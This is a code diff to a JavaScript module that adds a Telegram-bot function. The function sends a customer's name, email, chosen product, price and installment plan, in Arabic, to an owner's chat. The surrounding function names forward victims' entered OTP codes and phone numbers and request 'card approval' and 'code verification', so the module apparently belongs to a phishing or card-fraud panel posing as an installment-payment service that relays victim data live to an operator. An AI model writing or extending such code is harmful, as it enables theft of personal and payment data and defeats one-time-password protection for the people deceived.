@@ -352,6 +352,56 @@ const sendOtpEnteredNotification = async (sessionId, phoneNumber, code) => {
   }
 };
 
+const sendPlanSelectedNotification = async event => {
+  const bot = getBot();
+  if (!bot || !OWNER_CHAT_ID) return;
+
+  const {
+    sessionId,
+    userName,
+    userEmail,
+    productName,
+    productPrice,
+    installments,
+    perInstallment,
+    commission,
+    timestamp,
+  } = event;
+
+  const formatNum = num =>
+    new Intl.NumberFormat('en-US', { style: 'decimal', minimumFractionDigits: 0 }).format(num);
+
+  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
+  const installmentsText = installments === 1 ? 'دفعة' : 'دفعات';
+
+  let text = '📋 العميل اختار خطة الدفع\n';
+  text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+
+  text += `👤 العميل: ${userName || '—'}\n`;
+  text += `📧 الإيميل: ${userEmail || '—'}\n\n`;
+
+  text += `📦 المنتج: ${productName || '—'}\n`;
+  if (productPrice) text += `💰 السعر: ${formatNum(productPrice)} ر.س\n`;
+
+  text += '\n━━━━━━━━━━━━━━━━━━━━\n';
+  text += '📋 تفاصيل الخطة:\n\n';
+
+  text += `📆 ${installments || '—'} ${installmentsText}\n`;
+  if (perInstallment) text += `💵 كل دفعة ${formatNum(perInstallment)} ريال\n`;
+  if (commission) text += `⭐️ العمولة ${formatNum(commission)} ريال\n`;
+
+  text += '\n━━━━━━━━━━━━━━━━━━━━\n';
+  text += `📍 العميل الآن في: صفحة خطة الدفع\n\n`;
+  text += `🆔 Session: ${sessionShort}...\n`;
+  text += `📅 ${formatDate(timestamp || new Date())}\n`;
+
+  try {
+    await bot.sendMessage(OWNER_CHAT_ID, text);
+  } catch (err) {
+    console.error('[Telegram] sendPlanSelectedNotification error:', err.message);
+  }
+};
+
 const sendActivationCodeEnteredNotification = async (sessionId, phoneNumber, code) => {
   const bot = getBot();
   if (!bot || !OWNER_CHAT_ID) return;
@@ -377,6 +427,7 @@ module.exports = {
   sendNewOrderNotification,
   sendPaymentStatusNotification,
   sendCheckoutEventNotification,
+  sendPlanSelectedNotification,
   sendCardApprovalRequest,
   sendCodeVerificationRequest,
   sendActivationCode,
